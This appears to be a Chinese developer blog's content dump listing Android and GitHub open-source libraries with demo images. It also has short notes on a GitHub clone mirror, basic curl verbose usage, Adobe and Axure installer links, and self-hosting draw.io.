<h2 id="Blur-LIB-Android"><a href="#Blur-LIB-Android" class="headerlink" title="Blur-LIB-Android"></a>Blur-LIB-Android</h2><p>模糊视图背景的库。<br><a href="https://github.com/danielzeller/Blur-LIB-Android" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/danielzeller/Blur-LIB-Android/master/Artwork/Transition.gif" width="280" align="center"></p>
<h2 id="Android抓取网页内容生成图片"><a href="#Android抓取网页内容生成图片" class="headerlink" title="Android抓取网页内容生成图片"></a>Android抓取网页内容生成图片</h2><p><a href="https://github.com/zhangke3016/GeneratePicture" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/zhangke3016/GeneratePicture/master/gif/home.png" width="280" align="center"></p>
<h2 id="Toro视频-RecyclerView"><a href="#Toro视频-RecyclerView" class="headerlink" title="Toro视频 RecyclerView"></a>Toro视频 RecyclerView</h2><p>视频列表自动播放，制作简单，专为 RecyclerView 打造<br><a href="https://github.com/eneim/toro" target="_blank" rel="noopener">Github</a></p>
<h2 id="粒子动画效果android-particles"><a href="#粒子动画效果android-particles" class="headerlink" title="粒子动画效果android-particles"></a>粒子动画效果android-particles</h2><p><a href="https://github.com/ibrahimsn98/android-particles" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/ibrahimsn98/android-particles/master/art/particle2.gif" width="280" align="center"></p>
<h2 id="粒子动画效果Grav"><a href="#粒子动画效果Grav" class="headerlink" title="粒子动画效果Grav"></a>粒子动画效果Grav</h2><p><a href="https://github.com/glomadrian/Grav" target="_blank" rel="noopener">Github</a></p>
<p><img src="https://raw.githubusercontent.com/glomadrian/Grav/master/art/wave.gif" width="280" align="center"><br><img src="https://raw.githubusercontent.com/glomadrian/Grav/master/art/login.gif" width="280" align="center"><br><img src="https://raw.githubusercontent.com/glomadrian/Grav/master/art/path.gif" width="280" align="center"><br><img src="https://raw.githubusercontent.com/glomadrian/Grav/master/art/robot.gif" width="280" align="center"></p>
<h2 id="MaterialTransitions"><a href="#MaterialTransitions" class="headerlink" title="MaterialTransitions"></a>MaterialTransitions</h2><p>界面过渡动画<br><a href="https://github.com/toddway/MaterialTransitions" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/toddway/MaterialTransitions/master/img/activity-transitions.gif" width="280" align="center"></p>
<h2 id="UltraViewPager-1"><a href="#UltraViewPager-1" class="headerlink" title="UltraViewPager"></a>UltraViewPager</h2><p>阿里巴巴的UltraViewPager是一个封装多种特性的ViewPager，主要是为多页面切换场景提供统一解决方案。<br><a href="https://github.com/alibaba/UltraViewPager/blob/master/README-ch.md" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/alibaba/UltraViewPager/master/pics/pics1.gif" width="280" align="center"><br><img src="https://raw.githubusercontent.com/alibaba/UltraViewPager/master/pics/pics2.gif" width="280" align="center"></p>
<h2 id="TapTargetView"><a href="#TapTargetView" class="headerlink" title="TapTargetView"></a>TapTargetView</h2><p>指引用户操作的视图<br><a href="https://github.com/KeepSafe/TapTargetView" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/KeepSafe/TapTargetView/master/.github/video.gif" width="280" align="center"></p>
<h2 id="PageIndicatorView"><a href="#PageIndicatorView" class="headerlink" title="PageIndicatorView"></a>PageIndicatorView</h2><p>Viewpage的PageIndicator加了多种动画<br><a href="https://github.com/romandanylyk/PageIndicatorView" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/romandanylyk/PageIndicatorView/master/assets/preview_anim_drop.gif" width="280" align="center"></p>
<h2 id="BottomNavigation"><a href="#BottomNavigation" class="headerlink" title="BottomNavigation"></a>BottomNavigation</h2><p>可以给开发者自定义度高一点点吧<br><a href="https://github.com/Ashok-Varma/BottomNavigation" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/Ashok-Varma/BottomNavigation/master/all.gif" width="280" align="center"></p>
<h2 id="spruce-android"><a href="#spruce-android" class="headerlink" title="spruce-android"></a>spruce-android</h2><p>这个库提供了一种显示骨架加载视图的简便方法，它现在使用闪存动画的内存优化版本，因此速度更快，您也可以设置更大的布局动画。<br><a href="https://github.com/willowtreeapps/spruce-android" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/willowtreeapps/spruce-android/master/imgs/recycler-example.gif" width="280" align="center"></p>
<h2 id="android-saripaar"><a href="#android-saripaar" class="headerlink" title="android-saripaar"></a>android-saripaar</h2><p>使用注解来验证 EditText 表单，比如用户名、密码长度<br><a href="https://github.com/ragunathjawahar/android-saripaar" target="_blank" rel="noopener">Github</a><br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@NotEmpty</span></span><br><span class="line"><span class="meta">@Email</span></span><br><span class="line"><span class="keyword">private</span> EditText emailEditText;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Password</span>(min = <span class="number">6</span>, scheme = Password.Scheme.ALPHA_NUMERIC_MIXED_CASE_SYMBOLS)</span><br><span class="line"><span class="keyword">private</span> EditText passwordEditText;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ConfirmPassword</span></span><br><span class="line"><span class="keyword">private</span> EditText confirmPasswordEditText;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Checked</span>(message = <span class="string">"You must agree to the terms."</span>)</span><br><span class="line"><span class="keyword">private</span> CheckBox iAgreeCheckBox;</span><br></pre></td></tr></table></figure></p>
<h2 id="BasePopup"><a href="#BasePopup" class="headerlink" title="BasePopup"></a>BasePopup</h2><p>对PopupWindow的封装吧，简易PopupWindow的使用<br><a href="https://github.com/razerdp/BasePopup" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/razerdp/Pics/master/BasePopup/%E7%BC%96%E5%86%99xml.png" width="280" align="center"></p>
<h2 id="Android-Material-Intro-Screen"><a href="#Android-Material-Intro-Screen" class="headerlink" title="Android Material Intro Screen"></a>Android Material Intro Screen</h2><p>第一次启动所用的引导视图吧<br><a href="https://github.com/TangoAgency/material-intro-screen" target="_blank" rel="noopener">Github</a></p>
<p><img src="https://raw.githubusercontent.com/TangoAgency/material-intro-screen/master/images/simple_slide.gif" width="280"><img src="https://raw.githubusercontent.com/TangoAgency/material-intro-screen/master/images/permissions_slide.gif" width="280"></p>
<h2 id="ChatKit-for-Android"><a href="#ChatKit-for-Android" class="headerlink" title="ChatKit for Android"></a>ChatKit for Android</h2><p>ChatKit是一个库，用于简化像聊天这样简单任务的UI开发。它在样式化、自定义和数据管理方面具有灵活的可能性<br><a href="https://github.com/stfalcon-studio/ChatKit" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/stfalcon-studio/ChatKit/master/images/HEADER.jpg" width="480" align="center"></p>
<h2 id="MaterialChipsInput"><a href="#MaterialChipsInput" class="headerlink" title="MaterialChipsInput"></a>MaterialChipsInput</h2><p>输入信息作为标签TAG的形式显示<br><a href="https://github.com/pchmn/MaterialChipsInput" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/pchmn/MaterialChipsInput/master/docs/demo2.gif" width="280" align="center"></p>
<h2 id="Colours"><a href="#Colours" class="headerlink" title="Colours"></a>Colours</h2><p>一组漂亮的预定义颜色和一组颜色方法，使您的Android开发生活更轻松。<br><a href="https://github.com/MatthewYork/Colours" target="_blank" rel="noopener">Github</a></p>
<h2 id="android-upload-service"><a href="#android-upload-service" class="headerlink" title="android-upload-service"></a>android-upload-service</h2><p>上传文件，并显示上传进度，支持FTP和HTTP-Multipart<br><a href="https://github.com/gotev/android-upload-service" target="_blank" rel="noopener">Github</a><br><img src="https://user-images.githubusercontent.com/16792495/28752872-de9a8894-7529-11e7-823a-e51eda59f5b7.gif" width="280" align="center"></p>
<h2 id="CircularAnim"><a href="#CircularAnim" class="headerlink" title="CircularAnim"></a>CircularAnim</h2><p> Android水波动画帮助类，可应用于登录按钮的动画效果<br><a href="https://github.com/XunMengWinter/CircularAnim" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/XunMengWinter/source/master/gif/CircularAnimDemo.gif" width="280" align="center"></p>
<h2 id="MaterialSearchBar"><a href="#MaterialSearchBar" class="headerlink" title="MaterialSearchBar"></a>MaterialSearchBar</h2><p>Material风格的搜索控件<br><a href="https://github.com/mancj/MaterialSearchBar" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/mancj/MaterialSearchBar/master/art/preview.gif" width="380" align="center"></p>
<h2 id="MultiSnapRecyclerView"><a href="#MultiSnapRecyclerView" class="headerlink" title="MultiSnapRecyclerView"></a>MultiSnapRecyclerView</h2><p>多个RecyclerView一起的效果<br><a href="https://github.com/TakuSemba/MultiSnapRecyclerView" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/TakuSemba/MultiSnapRecyclerView/master/arts/gravity.gif" width="280" align="center"><br><img src="https://raw.githubusercontent.com/TakuSemba/MultiSnapRecyclerView/master/arts/snap_count.gif" width="280" align="center"></p>
<h2 id="RealtimeBlurView"><a href="#RealtimeBlurView" class="headerlink" title="RealtimeBlurView"></a>RealtimeBlurView</h2><p>实时加模糊效果，这个库性能挺好的，模糊的库很多，之前看到的都不能实时渲染<br><a href="https://github.com/mmin18/RealtimeBlurView" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/mmin18/RealtimeBlurView/master/imgs/1.gif" width="280" align="center"></p>
<h2 id="ShapeOfView"><a href="#ShapeOfView" class="headerlink" title="ShapeOfView"></a>ShapeOfView</h2><p>给任何android视图一个自定义形状<br><a href="https://github.com/florent37/ShapeOfView" target="_blank" rel="noopener">Github</a></p>
<p><img src="https://raw.githubusercontent.com/florent37/ShapeOfView/master/medias/sample_arc.gif" width="280" align="center"></p>
<p><img src="https://raw.githubusercontent.com/florent37/ShapeOfView/master/medias/edges_corners.png" width="380" align="center"></p>
<p><img src="https://raw.githubusercontent.com/florent37/ShapeOfView/master/medias/triangle.png" width="380" align="center"></p>
<h2 id="Long-Shadows"><a href="#Long-Shadows" class="headerlink" title="Long-Shadows"></a>Long-Shadows</h2><p>给视图加长长的阴影<br><a href="https://github.com/harjot-oberai/Long-Shadows" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/harjot-oberai/Long-Shadows/master/screens/cover.png" alt></p>
<h2 id="MaterialShadows"><a href="#MaterialShadows" class="headerlink" title="MaterialShadows"></a>MaterialShadows</h2><p>给视图加Material风格的阴影效果<br><a href="https://github.com/harjot-oberai/MaterialShadows" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/harjot-oberai/MaterialShadows/master/screens/cover.png" width="380" align="center"></p>
<h2 id="Hellocharts"><a href="#Hellocharts" class="headerlink" title="Hellocharts"></a>Hellocharts</h2><p>图表绘制<br><a href="https://github.com/lecho/hellocharts-android" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/lecho/hellocharts-android/master/screens/scr_dependecy_preview.gif" width="280" align="center"></p>
<h2 id="StatusBarUtil"><a href="#StatusBarUtil" class="headerlink" title="StatusBarUtil"></a>StatusBarUtil</h2><p>状态栏工具类<br><a href="https://github.com/laobie/StatusBarUtil" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/laobie/StatusBarUtil/master/img/use_in_fragment.gif" width="280" align="center"></p>
<h2 id="material-components-android"><a href="#material-components-android" class="headerlink" title="material-components-android"></a>material-components-android</h2><p>可以帮助开发人员实现 Material Design 风格，由谷歌的核心工程师团队和UX设计人员开发，是模块化且可定制的。这些组件可以建立可靠的开发工作流程，以构建美观且功能强大的安卓应用。<br>安卓 Material 组件可以直接替换（a drop-in replacement）安卓的设计支持库。<br><a href="https://github.com/material-components/material-components-android" target="_blank" rel="noopener">Github</a></p>
<h2 id="FancyToast-Android"><a href="#FancyToast-Android" class="headerlink" title="FancyToast-Android"></a>FancyToast-Android</h2><p>toast另外一种形态<br><a href="https://github.com/Shashank02051997/FancyToast-Android" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/Shashank02051997/FancyToast-Android/master/fancytoastcollage.png" width="280" align="center"></p>
<h2 id="提示-Alerter"><a href="#提示-Alerter" class="headerlink" title="提示-Alerter"></a>提示-Alerter</h2><p><a href="https://github.com/Tapadoo/Alerter" target="_blank" rel="noopener">Github</a><br>An Android Alerter Library, now in Kotlin!<br><img src="https://raw.githubusercontent.com/Tapadoo/Alerter/master/documentation/alert_default.gif" width="280" align="center"></p>
<h2 id="提示-CookieBar"><a href="#提示-CookieBar" class="headerlink" title="提示-CookieBar"></a>提示-CookieBar</h2><p><a href="https://github.com/liuguangqiang/CookieBar" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/liuguangqiang/CookieBar/master/arts/default.gif" width="280" align="center"></p>
<h2 id="提示-Snacky"><a href="#提示-Snacky" class="headerlink" title="提示-Snacky"></a>提示-Snacky</h2><p>相对系统自带的，它可以配置多种颜色，比如：成功用绿色，错误用红色。<br><a href="https://github.com/matecode/Snacky" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/matecode/Snacky/raw/master/screenshots/success.png" width="280" align="center"></p>
<h2 id="基于Wexx和Vue的框架eros"><a href="#基于Wexx和Vue的框架eros" class="headerlink" title="基于Wexx和Vue的框架eros"></a>基于Wexx和Vue的框架eros</h2><blockquote>
<p>在 weex 提供的支持下，用一份 vue 写法的代码，编译成 iOS/Android 两端原生APP，并且通过我们内置的热更新逻辑和开源的服务器逻辑，可以使开发者以极快的速度开发 APP ，并赋予 APP 热更新能力(不用经过 appStore/android market 市场审核)。<br><a href="https://github.com/bmfe/eros" target="_blank" rel="noopener">Github</a><br>这是使用这个框架的设计图，项目中还有更多图<br><img src="https://raw.githubusercontent.com/bmfe/eros-docs/master/eros-products/dgg1.jpg" width="280" align="center"></p>
</blockquote>
<h2 id="换肤Android-skin-support"><a href="#换肤Android-skin-support" class="headerlink" title="换肤Android-skin-support"></a>换肤Android-skin-support</h2><p><a href="https://github.com/ximsfei/Android-skin-support" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/ximsfei/Res/master/skin/preview/default.png" width="280" align="center"></p>
<h2 id="CoordinatorTabLayout"><a href="#CoordinatorTabLayout" class="headerlink" title="CoordinatorTabLayout"></a>CoordinatorTabLayout</h2><p>是一个自定义组合控件,可快速实现TabLayout与CoordinatorLayout相结合的样式 继承至CoordinatorLayout, 在该组件下面使用了CollapsingToolbarLayout包含TabLayout<br><a href="https://github.com/hugeterry/CoordinatorTabLayout" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/hugeterry/CoordinatorTabLayout/master/showUI/show1.gif" width="280" align="center"></p>
<h2 id="目前活跃的项目收集归纳"><a href="#目前活跃的项目收集归纳" class="headerlink" title="目前活跃的项目收集归纳"></a>目前活跃的项目收集归纳</h2><p><a href="https://github.com/ddwhan0123/Useful-Open-Source-Android" target="_blank" rel="noopener">Useful-Open-Source-Android</a></p>
]]></content>
      <categories>
        <category>Github</category>
      </categories>
      <tags>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title>Axure RP 9</title>
    <url>/%E5%89%8D%E7%AB%AF/Axure%20RP%209/</url>
    <content><![CDATA[<p><a href="https://www.axure.com/release-history/rp9" target="_blank" rel="noopener">RP9 Release 历史</a></p>
<h3 id="9-0-0-3687版本的秘钥（高版本可能不支持）"><a href="#9-0-0-3687版本的秘钥（高版本可能不支持）" class="headerlink" title="9.0.0.3687版本的秘钥（高版本可能不支持）"></a>9.0.0.3687版本的秘钥（高版本可能不支持）</h3><p><a href="https://axure.cachefly.net/versions/9-0/AxureRP-Setup-3687.exe" target="_blank" rel="noopener">【Axure RP 9.0.0.3687版本下载地址】</a></p>
<p>。。。附件中</p>
<h3 id="9-0-0-3646版本的秘钥（这是9系列的第一个版本，高版本可能不支持）"><a href="#9-0-0-3646版本的秘钥（这是9系列的第一个版本，高版本可能不支持）" class="headerlink" title="9.0.0.3646版本的秘钥（这是9系列的第一个版本，高版本可能不支持）"></a>9.0.0.3646版本的秘钥（这是9系列的第一个版本，高版本可能不支持）</h3><p><a href="https://axure.cachefly.net/versions/9-0/AxureRP-Setup-3646.exe" target="_blank" rel="noopener">【Axure RP 9.0.0.3646版本下载地址】</a></p>
<p>。。。附件中</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>axure</tag>
      </tags>
  </entry>
  <entry>
    <title>GitHub加速</title>
    <url>/github/github%E5%8A%A0%E9%80%9F/</url>
    <content><![CDATA[<p>国内 <code>git clone</code> github上的仓库一直不快，但现在很慢，经常超时，发现一个镜像加速站点: <code>github.com.cnpmjs.org</code>。</p>
<p>如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git clone https://github.com/bilibili/ijkplayer.git</span><br><span class="line"></span><br><span class="line"># 改为</span><br><span class="line"></span><br><span class="line">$ git clone https://github.com.cnpmjs.org/bilibili/ijkplayer.git</span><br></pre></td></tr></table></figure>
<p>速度体验符合预期！！！</p>
<p>而且 <a href="https://github.com.cnpmjs.org" target="_blank" rel="noopener">github.com.cnpmjs.org</a> 也可以网页浏览，但不可以登录。</p>
]]></content>
      <categories>
        <category>Github</category>
      </categories>
      <tags>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title>Curl命令备忘</title>
    <url>/%E5%89%8D%E7%AB%AF/Curl%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98/</url>
    <content><![CDATA[<h2 id="打印HTTP包信息"><a href="#打印HTTP包信息" class="headerlink" title="打印HTTP包信息"></a>打印HTTP包信息</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ curl -v URL</span><br><span class="line">$ curl --verbose URL</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ curl -v -X POST http://localhost/ping</span><br><span class="line">&gt; POST /ping HTTP/1.1</span><br><span class="line">&gt; Host: localhost</span><br><span class="line">&gt; User-Agent: curl/7.47.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">&lt; HTTP/1.1 200 </span><br><span class="line">&lt; Server: nginx</span><br><span class="line">&lt; Date: Tue, 23 Jul 2019 04:07:18 GMT</span><br><span class="line">&lt; Content-Type: text/plain;charset=UTF-8</span><br><span class="line">&lt; Content-Length: 5</span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line">&lt; </span><br><span class="line">PONG</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>Curl</tag>
      </tags>
  </entry>
  <entry>
    <title>PS&amp;AI2018离线安装包</title>
    <url>/%E5%89%8D%E7%AB%AF/Adobe%20CC%202018%E7%A6%BB%E7%BA%BF%E5%AE%89%E8%A3%85%E5%8C%85/</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th>Product</th>
<th>Windows</th>
<th>macOS</th>
</tr>
</thead>
<tbody>
<tr>
<td>PS</td>
<td><a href="http://prdl-download.adobe.com/Photoshop/66A1D1E00DE44601B041A631261EC584/1507845150875/AdobePhotoshop19-mul.zip" target="_blank" rel="noopener">Windows (32 bit)</a> \  <a href="http://prdl-download.adobe.com/Photoshop/66A1D1E00DE44601B041A631261EC584/1507846032938/AdobePhotoshop19-mul_x64.zip" target="_blank" rel="noopener">Windows (64 bit)</a></td>
<td><a href="http://prdl-download.adobe.com/Photoshop/66A1D1E00DE44601B041A631261EC584/1507851230691/AdobePhotoshop19-mul.dmg" target="_blank" rel="noopener">macOS (64 bit)</a></td>
</tr>
<tr>
<td>AI</td>
<td><a href="http://prdl-download.adobe.com/Illustrator/C1208DBFE1D04A81A21C62CDF6A96AC6/1509976186706/AdobeIllustrator22_HD_win32.zip" target="_blank" rel="noopener">Windows (32 bit)</a> \ <a href="http://prdl-download.adobe.com/Illustrator/C1208DBFE1D04A81A21C62CDF6A96AC6/1509968804429/AdobeIllustrator22_HD_win64.zip" target="_blank" rel="noopener">Windows (64 bit)</a></td>
<td><a href="http://prdl-download.adobe.com/Illustrator/C1208DBFE1D04A81A21C62CDF6A96AC6/1509969961594/AdobeIllustrator22_HD.dmg" target="_blank" rel="noopener">macOS (64 bit)</a></td>
</tr>
</tbody>
</table>
<p><a href="https://www.yigeni.cc/adobe-cc-2018-2019-offline-installation-package/" target="_blank" rel="noopener">【参考】</a></p>
]]></content>
  </entry>
  <entry>
    <title>GitHub资源备忘2021</title>
    <url>/github/GitHub%E8%B5%84%E6%BA%90%E5%A4%87%E5%BF%982021/</url>
    <content><![CDATA[<h2 id="音频条形图"><a href="#音频条形图" class="headerlink" title="音频条形图"></a>音频条形图</h2><p><a href="https://github.com/xfans/VoiceWaveView" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/xfans/VoiceWaveView/blob/master/pic/3.gif" alt></p>
<h2 id="音频-声音波纹动画"><a href="#音频-声音波纹动画" class="headerlink" title="音频/声音波纹动画"></a>音频/声音波纹动画</h2><p><a href="https://github.com/Aghajari/AXWaveAnimation" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/Aghajari/AXWaveAnimation/blob/main/AXWaveAnimation.gif" alt><br><img src="https://github.com/Aghajari/AXWaveAnimation/blob/main/Screenshot3.png" alt></p>
<h2 id="StepView订单流程"><a href="#StepView订单流程" class="headerlink" title="StepView订单流程"></a>StepView订单流程</h2><p><a href="https://gitee.com/mirrors/stepview" target="_blank" rel="noopener">Gitee</a><br><a href="https://gitee.com/mirrors/stepview/blob/master/Introduction.md" target="_blank" rel="noopener">介绍</a><br><img src="https://gitee.com/mirrors/stepview/raw/master/art/snapshot.png" alt></p>
<h2 id="Coil-是一个-Android-图片加载库"><a href="#Coil-是一个-Android-图片加载库" class="headerlink" title="Coil 是一个 Android 图片加载库"></a>Coil 是一个 Android 图片加载库</h2><p>通过 Kotlin 协程的方式加载图片，Coil 首选 Kotlin 语言开发并且使用包含 Coroutines, OkHttp, Okio 和 AndroidX Lifecycles 在内最流行的开源库。Coil 只有2000个方法（前提是你的 APP 里面集成了 OkHttp 和 Coroutines），Coil 和 Picasso 的方法数差不多，相比 Glide 和 Fresco 要轻量很多。<br><a href="https://github.com/coil-kt/coil/blob/master/README-zh.md" target="_blank" rel="noopener">Github</a><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">implementation(&quot;io.coil-kt:coil:1.2.1&quot;)</span><br><span class="line"></span><br><span class="line">// URL</span><br><span class="line">imageView.load(&quot;https://www.example.com/image.jpg&quot;)</span><br><span class="line"></span><br><span class="line">// Resource</span><br><span class="line">imageView.load(R.drawable.image)</span><br><span class="line"></span><br><span class="line">// File</span><br><span class="line">imageView.load(File(&quot;/path/to/image.jpg&quot;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 自定义</span><br><span class="line">imageView.load(&quot;https://www.example.com/image.jpg&quot;) &#123;</span><br><span class="line">    crossfade(true)</span><br><span class="line">    placeholder(R.drawable.image)</span><br><span class="line">    transformations(CircleCropTransformation())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Github</category>
      </categories>
      <tags>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title>Drawio在线绘图开源</title>
    <url>/%E5%89%8D%E7%AB%AF/Drawio%E5%9C%A8%E7%BA%BF%E7%BB%98%E5%9B%BE%E5%BC%80%E6%BA%90/</url>
    <content><![CDATA[<p>很早知道国外的<strong>在线绘图服务Draw.io</strong>了，虽然是免费的而且好用，但网络速度慢啊，所以一直没用。<br>而且国内有<a href="https://gitmind.cn" target="_blank" rel="noopener">【Gitmind思维导图】</a> 和 <a href="https://processon.com/" target="_blank" rel="noopener">【ProcessOn免费在线流程图思维导图】</a> 也是免费而且挺好用的。</p>
<p>自从阅读文章<a href="https://mp.weixin.qq.com/s/shH7DRkQapdrBCdCgbTdcA" target="_blank" rel="noopener">【部署一个私有的在线绘图服务】</a>，等知drawio开源了项目<a href="https://github.com/jgraph/drawio" target="_blank" rel="noopener">【jgraph/drawio】</a> ，很感兴趣。</p>
<p>这样的话我们是可以在本地局域网部署drawio服务，网速慢的问题就解决了，以后绘图软件就增多了新的一个选择。</p>
<p>而且这个文章作者还把开源版drawio的后端Java部分裁剪掉了(具体裁剪文章上有记录)，变成纯网页版<a href="https://github.com/tobyqin/drawio-local" target="_blank" rel="noopener">【tobyqin/drawio-local】</a>，部署也变得更加简单，把这个项目下载下来直接丢在一个webserver(如：nginx，apache，iis等)上就可以直接用。</p>
<blockquote>
<p>drawio默认是英文，可以切换为中文</p>
</blockquote>
<p>这是我运行的效果：<br><img src="/images/前端/drawio1.png" alt><br><img src="/images/前端/drawio2.png" alt><br><img src="/images/前端/drawio3.png" alt></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>drawio</tag>
      </tags>
  </entry>
  <entry>
    <title>GitHub资源备忘2018</title>
    <url>/github/GitHub%E8%B5%84%E6%BA%90%E5%A4%87%E5%BF%982018/</url>
    <content><![CDATA[<p><a href="https://github.com/trending/java" target="_blank" rel="noopener">https://github.com/trending/java</a></p>
<h2 id="头像生成"><a href="#头像生成" class="headerlink" title="头像生成"></a>头像生成</h2><p><a href="https://github.com/fangpenlin/avataaars-geneator" target="_blank" rel="noopener">Github</a><br><a href="https://getavataaars.com" target="_blank" rel="noopener">预览地址</a></p>
<h2 id="VerticalSlideView"><a href="#VerticalSlideView" class="headerlink" title="VerticalSlideView"></a>VerticalSlideView</h2><p>类似淘宝的商品详情页，继续拖动查看详情，其中拖动增加了阻尼，并且重写了ListView，GridView，ScrollView，WebView，RecyclerView 的 dispatchTouchEvent 方法，使用的时候无须额外的代码，可以任意嵌套使用。<br><a href="https://github.com/jeasonlzy/VerticalSlideView" target="_blank" rel="noopener">Github</a><br><img src="http://7xss53.com2.z0.glb.clouddn.com/verticalslideview/demo2.gif" width="180" align="center"></p>
<h2 id="Java-的-Markdown-解析器-commonmark-java"><a href="#Java-的-Markdown-解析器-commonmark-java" class="headerlink" title="Java 的 Markdown 解析器 commonmark-java"></a>Java 的 Markdown 解析器 commonmark-java</h2><p>commonmark-java 是一个 Markdown 解析器，一个基于 CommonMark 规范解析和渲染 Markdown 文本的 Java 库<br><a href="https://github.com/atlassian/commonmark-java" target="_blank" rel="noopener">Github</a><br>具有以下特性：</p>
<ul>
<li>小（最小化的依赖）</li>
<li>快 （比 pegdown 快 10-20 倍，在仓库中可查看 benchmarks）</li>
<li>灵活 （解析后可操作 AST，自定义 HTML 渲染）</li>
<li>可扩展（表格，删除线，自动链接等等）</li>
</ul>
<h2 id="利用图表实现价格范围添加的Android库"><a href="#利用图表实现价格范围添加的Android库" class="headerlink" title="利用图表实现价格范围添加的Android库"></a>利用图表实现价格范围添加的Android库</h2><p><a href="https://github.com/stfalcon-studio/StfalconPriceRangeBar-android" target="_blank" rel="noopener">Github</a><br><img src="https://i.imgur.com/Ztu6kKp.gif" width="180" align="center"></p>
<h2 id="标签组件"><a href="#标签组件" class="headerlink" title="标签组件"></a>标签组件</h2><p>Kongzue StackLabel 是堆叠标签组件，适合快速完成需要堆叠标签的场景，例如“搜索历史”、“猜你喜欢”等功能。<br><a href="https://github.com/kongzue/StackLabel" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/kongzue/Res/master/app/src/main/res/mipmap-xxxhdpi/stacklabel_demo.png" width="180" align="center"></p>
<h2 id="一个Android颜色选择器库"><a href="#一个Android颜色选择器库" class="headerlink" title="一个Android颜色选择器库"></a>一个Android颜色选择器库</h2><p><a href="https://github.com/Madrapps/Pikolo" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/Madrapps/Pikolo/master/preview/preview-full.gif" width="180" align="center"><br><img src="https://raw.githubusercontent.com/Madrapps/Pikolo/master/preview/arc-selectors.gif" width="180" align="center"></p>
<h2 id="HoloColorPicker"><a href="#HoloColorPicker" class="headerlink" title="HoloColorPicker"></a>HoloColorPicker</h2><p><a href="https://github.com/LarsWerkman/HoloColorPicker" target="_blank" rel="noopener">Github</a><br><img src="https://lh6.googleusercontent.com/-Rn5TDr6QoG4/UQk8OPpsPEI/AAAAAAAAAX0/TKlibuBjupo//framed_HoloColorPicker.png" width="180" align="center"></p>
<h2 id="ColorPickerView"><a href="#ColorPickerView" class="headerlink" title="ColorPickerView"></a>ColorPickerView</h2><p><a href="https://github.com/skydoves/ColorPickerView" target="_blank" rel="noopener">Github</a><br><img src="https://user-images.githubusercontent.com/24237865/45308725-1db83e80-b55d-11e8-84b0-1d48c0405365.jpg" width="180" align="center"></p>
<h2 id="ColorPicker"><a href="#ColorPicker" class="headerlink" title="ColorPicker"></a>ColorPicker</h2><p><a href="https://github.com/jaredrummler/ColorPicker" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/jaredrummler/ColorPicker/master/art/demo.gif" width="180" align="center"></p>
<h2 id="圆形SeekBar"><a href="#圆形SeekBar" class="headerlink" title="圆形SeekBar"></a>圆形SeekBar</h2><p><a href="https://github.com/harjot-oberai/Croller" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/harjot-oberai/Croller/master/gifs/croller_1.gif" width="180" align="center"></p>
<h2 id="垂直SeekBar"><a href="#垂直SeekBar" class="headerlink" title="垂直SeekBar"></a>垂直SeekBar</h2><p><a href="https://github.com/h6ah4i/android-verticalseekbar" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/h6ah4i/android-verticalseekbar/master/pic/marshmallow.png" width="180" align="center"></p>
